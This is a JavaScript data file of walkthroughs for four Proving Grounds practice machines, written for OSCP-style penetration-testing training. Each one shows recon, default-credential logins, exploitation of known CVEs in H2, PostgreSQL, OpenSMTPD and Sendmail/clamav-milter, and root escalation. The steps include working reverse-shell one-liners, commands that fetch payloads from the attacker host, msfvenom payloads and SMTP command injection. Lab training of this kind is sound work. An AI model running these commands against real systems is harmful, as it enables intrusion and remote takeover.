/* Step-by-step walkthroughs for labs, shown on the lab page.
   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */
window.OSCP_GUIDES = {
 "pgp-jacko": {
  "title": "Windows · H2 database → PaperStream privesc",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.66"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN jacko_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,5040,8082,9092 -Pn {T} -oN jacko_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http     Microsoft IIS 10.0  |_http-title: H2 Database Engine (redirect)\n445/tcp  open  microsoft-ds?\n8082/tcp open  http     H2 database http console\n9092/tcp open  XmlIpcRegSvc?"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **H2 web console on port 8082**."
     }
    ]
   },
   {
    "h": "Get into the H2 console",
    "b": [
     {
      "t": "p",
      "v": "Browse to `http://{T}:8082` and log in with:"
     },
     {
      "t": "list",
      "v": [
       "JDBC URL: `jdbc:h2:~/test`",
       "User: `sa`",
       "Password: blank ✅ (the default works)"
      ]
     },
     {
      "t": "p",
      "v": "The footer shows **H2 1.4.199**, which is vulnerable to JNI code execution (**EDB-49384**)."
     }
    ]
   },
   {
    "h": "RCE through SQL (EDB-49384)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit h2 1.4.199\nsearchsploit -m 49384"
     },
     {
      "t": "p",
      "v": "Paste the queries from `49384.txt` into the console in this order:"
     },
     {
      "t": "list",
      "v": [
       "`SELECT CSVWRITE('C:\\Windows\\Temp\\JNIScriptEngine.dll', ...)`: the long hex blob from the file, which drops the DLL.",
       "Load it, create the eval alias and test it:"
      ]
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CREATE ALIAS IF NOT EXISTS System_load FOR \"java.lang.System.load\";\nCALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "out",
      "v": "jacko\\tony"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **tony**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali, serve nc.exe and start a listener:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "Run these through H2, one at a time (they replace the `exec(\"...\")` part):"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"certutil -urlcache -split -f http://{K}/nc.exe C:/Users/tony/nc.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"C:/Users/tony/nc.exe {K} 8082 -e cmd.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "warn",
      "v": "Call back on **port 8082**. Egress is filtered, so use a port the box already uses."
     }
    ]
   },
   {
    "h": "Fix the broken PATH (Jacko-specific)",
    "b": [
     {
      "t": "p",
      "v": "`whoami` says \"not recognized\" until you run this:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;\nwhoami\ntype C:\\Users\\tony\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv\ndir \"C:\\Program Files (x86)\"\ntype \"C:\\Program Files (x86)\\PaperStream IP\\TWAIN\\readmeenu.rtf\""
     },
     {
      "t": "p",
      "v": "Found **PaperStream IP (TWAIN) 1.42**, which is vulnerable to **EDB-49382**: a DLL hijack through the FJTWSVIC service, which runs as SYSTEM."
     }
    ]
   },
   {
    "h": "SYSTEM via PaperStream (EDB-49382)",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 49382\nmv 49382.ps1 exploit.ps1\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=8082 -f dll -o UninOldIS.dll\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In `exploit.ps1`, set `$PayloadFile = \"C:\\Windows\\Temp\\UninOldIS.dll\"`."
     },
     {
      "t": "p",
      "v": "Start a new listener (kill the old one, or use another tab):"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "On the target:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "cd C:\\Windows\\Temp\ncertutil -urlcache -split -f http://{K}/UninOldIS.dll UninOldIS.dll\ncertutil -urlcache -split -f http://{K}/exploit.ps1 exploit.ps1\npowershell -ep bypass C:\\Windows\\Temp\\exploit.ps1"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: GodPotato",
   "b": [
    {
     "t": "p",
     "v": "If `whoami /priv` shows **SeImpersonatePrivilege** enabled:"
    },
    {
     "t": "code",
     "lang": "cmd",
     "v": "certutil -urlcache -split -f http://{K}/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Users\\tony\\nc.exe {K} 8082 -e cmd.exe\""
    }
   ]
  },
  "takeaways": [
   "🔑 Try **default creds** on every web console (`sa` with a blank password).",
   "🌐 A reverse shell that dies means **egress is filtered**: reuse an open port like 8082 or 80.",
   "🛠️ A shell where nothing works usually means a **broken PATH**: set it by hand.",
   "📂 Always check `Program Files (x86)` for third-party software, then `searchsploit` its version."
  ]
 },
 "pgp-nibbles": {
  "title": "Linux · Postgres RCE → SUID find",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.47"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN nibbles_ports.txt\nsudo nmap -sC -sV -p 21,22,80,139,445,5437 -Pn {T} -oN nibbles_svc.txt"
     },
     {
      "t": "out",
      "v": "21/tcp   open   ftp         vsftpd 3.0.3\n22/tcp   open   ssh         OpenSSH 7.9p1 Debian\n80/tcp   open   http        Apache httpd 2.4.38\n139/tcp  closed netbios-ssn\n445/tcp  closed microsoft-ds\n5437/tcp open   postgresql  PostgreSQL DB 11.3 - 11.7"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **PostgreSQL on port 5437**, an odd port that only a full `-p-` scan finds."
     }
    ]
   },
   {
    "h": "Dead ends",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ftp {T}\ncurl -s http://{T}/"
     },
     {
      "t": "p",
      "v": "❌ FTP has no anonymous login, and the website is a static page. Move on."
     }
    ]
   },
   {
    "h": "Postgres default creds",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "psql -h {T} -p 5437 -U postgres"
     },
     {
      "t": "p",
      "v": "Password: `postgres`"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT version();\n\\du"
     },
     {
      "t": "out",
      "v": "PostgreSQL 11.7 (Debian 11.7-0+deb10u1)\n postgres | Superuser, Create role, Create DB, Replication, Bypass RLS"
     },
     {
      "t": "p",
      "v": "✅ You are a **superuser**, so `COPY FROM PROGRAM` gives RCE (CVE-2019-9193)."
     }
    ]
   },
   {
    "h": "Read files (optional)",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT pg_read_file('/etc/passwd', 0, 2000);"
     },
     {
      "t": "out",
      "v": "wilson:x:1000:1000:...:/home/wilson:/bin/bash"
     },
     {
      "t": "p",
      "v": "The user is **wilson**."
     }
    ]
   },
   {
    "h": "RCE",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **postgres**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "In psql:"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/{K}/80 0>&1\"';"
     },
     {
      "t": "out",
      "v": "postgres@nibbles:/var/lib/postgresql/11/main$"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**. psql hangs while the shell is open, which is normal."
     }
    ]
   },
   {
    "h": "Stabilise the shell and grab local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm"
     },
     {
      "t": "p",
      "v": "Press `Ctrl+Z`, then on Kali run `stty raw -echo; fg` and press Enter."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /home/wilson/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -perm -u=s -type f 2>/dev/null"
     },
     {
      "t": "out",
      "v": "/usr/bin/su\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/find      <-- not normal!\n/usr/bin/sudo"
     },
     {
      "t": "p",
      "v": "🎯 `find` has the SUID bit set, and it's on **GTFOBins**."
     }
    ]
   },
   {
    "h": "Root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "/usr/bin/find . -exec /bin/sh -p \\; -quit\nid\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) euid=0(root)"
     },
     {
      "t": "warn",
      "v": "The `-p` flag is required. Without it, the shell drops the root privileges."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 Always run a **full port scan**: services hide on odd ports.",
   "🔑 For any database, try **default creds** first (`postgres:postgres`).",
   "💥 A Postgres superuser gets RCE through `COPY FROM PROGRAM`, no exploit needed.",
   "🌐 If a reverse shell fails, reuse port **80 or 443** to get past the egress filter.",
   "📂 Run `find / -perm -u=s` and check every unusual binary on **GTFOBins**."
  ]
 },
 "pgp-bratarina": {
  "title": "Linux · OpenSMTPD RCE → direct root",
  "lab": {
   "name": "Bratarina",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.71"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag** on this box: `proof.txt`."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN brat_ports.txt\nsudo nmap -sC -sV -p 22,25,53,80,445 -Pn {T} -oN brat_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu\n25/tcp  open   smtp         OpenSMTPD\n53/tcp  closed domain\n80/tcp  open   http         nginx 1.14.0  (FlaskBB)\n445/tcp open   netbios-ssn  Samba smbd 4.7.6-Ubuntu"
     },
     {
      "t": "p",
      "v": "🎯 The leads are **SMB (445)** and **OpenSMTPD (25)**."
     }
    ]
   },
   {
    "h": "SMB null session",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N -L //{T}/"
     },
     {
      "t": "out",
      "v": "backups   Disk   Share for backups"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N //{T}/backups"
     },
     {
      "t": "p",
      "v": "Inside the smbclient prompt:"
     },
     {
      "t": "code",
      "lang": "smb",
      "v": "get passwd.bak\nexit"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat passwd.bak"
     },
     {
      "t": "out",
      "v": "neil:x:1000:1000:neil,,,:/home/neil:/bin/bash"
     },
     {
      "t": "p",
      "v": "🐇 A rabbit hole: you get a username and nothing else. Move on to SMTP."
     }
    ]
   },
   {
    "h": "SMTP banner and searchsploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 bratarina ESMTP OpenSMTPD"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit opensmtpd\nsearchsploit -m 47984"
     },
     {
      "t": "out",
      "v": "OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2020-7247**: commands are injected through the MAIL FROM field and run **as root**."
     }
    ]
   },
   {
    "h": "Confirm the RCE",
    "b": [
     {
      "t": "p",
      "v": "Terminal 1:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo tcpdump -i tun0 icmp"
     },
     {
      "t": "p",
      "v": "Terminal 2:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'ping -c 2 {K}'"
     },
     {
      "t": "out",
      "v": "IP {T} > {K}: ICMP echo request"
     },
     {
      "t": "p",
      "v": "✅ RCE is confirmed."
     }
    ]
   },
   {
    "h": "Reverse shell as root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{K}\\\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: host a script and fetch it",
   "b": [
    {
     "t": "code",
     "lang": "bash",
     "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 445"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "python3 47984.py {T} 25 'wget http://{K}:445/shell.sh -O /tmp/shell.sh'\npython3 47984.py {T} 25 'bash /tmp/shell.sh'"
    }
   ]
  },
  "takeaways": [
   "📡 **Grab the banner** of every service, then `searchsploit` it.",
   "📂 Check SMB with a **null session** (`smbclient -N -L`).",
   "🐇 Don't get stuck on rabbit holes like passwd.bak.",
   "🏓 For blind RCE, confirm with `ping` and `tcpdump` first.",
   "🌐 To get past the egress filter, call back on ports the box already uses (**80, 445**).",
   "👑 A service running as root gives you root directly, with no privesc needed."
  ]
 },
 "pgp-clamav": {
  "title": "Linux · Sendmail + clamav-milter RCE → direct root",
  "lab": {
   "name": "ClamAV",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.52"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag**, `proof.txt`: the exploit drops you straight in as root."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN clam_ports.txt\nsudo nmap -sC -sV -p 22,25,80 -Pn {T} -oN clam_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu\n25/tcp open  smtp     Sendmail 8.15.2\n80/tcp open  http     Apache httpd 2.4.18"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **Sendmail on 25**, paired with **clamav-milter** on this box."
     }
    ]
   },
   {
    "h": "SMTP banner",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 clamav ESMTP Sendmail 8.15.2"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2007-4560**: the `RCPT TO` field is passed to a shell, so commands run **as root**."
     }
    ]
   },
   {
    "h": "Find the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit clamav\nsearchsploit -m 4761"
     },
     {
      "t": "out",
      "v": "Sendmail with clamav-milter < 0.91.2 - Remote Root Command Execution | 4761.pl"
     }
    ]
   },
   {
    "h": "Manual exploit, part 1: download the payload",
    "b": [
     {
      "t": "p",
      "v": "On Kali, make the payload and host it:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "Open an SMTP session and inject through the backticks in `RCPT TO`:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`wget http://{K}/shell.sh -O /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "p",
      "v": "Wait for `GET /shell.sh` in the web server window, then stop it with `Ctrl+C`."
     },
     {
      "t": "warn",
      "v": "Keep the **nobody+** format with its backticks exactly as shown: the backticks are what run the command."
     }
    ]
   },
   {
    "h": "Manual exploit, part 2: run it as root",
    "b": [
     {
      "t": "warn",
      "v": "The web server and the listener both need **port 80** on Kali (egress is filtered), and only one can use it at a time. Stop the web server before you start the listener."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "A second mail runs the payload:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`bash /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "p",
      "v": "👑 Root shell on the listener."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: the automated exploit",
   "b": [
    {
     "t": "p",
     "v": "Same order: web server on 80 for the first command, then stop it and start the listener on 80 for the second."
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "perl 4761.pl {T} 'wget http://{K}/shell.sh -O /tmp/s.sh'\nperl 4761.pl {T} 'bash /tmp/s.sh'"
    },
    {
     "t": "p",
     "v": "Keep download and execute as two commands: a single chained one is unreliable through the milter."
    }
   ]
  },
  "takeaways": [
   "📧 **Sendmail + clamav** is a signature combo: go straight to CVE-2007-4560.",
   "📖 Read the **header/usage** of any downloaded exploit: argument order varies between copies.",
   "🖐️ Prefer the **manual method** when a scripted exploit is flaky.",
   "✂️ Split **download** and **execute** into two steps.",
   "🌐 Egress filtered? Reuse **port 80** for hosting and the callback, one at a time.",
   "👑 RCE as a root service means a **direct root shell**, no privesc stage."
  ]
 }
};
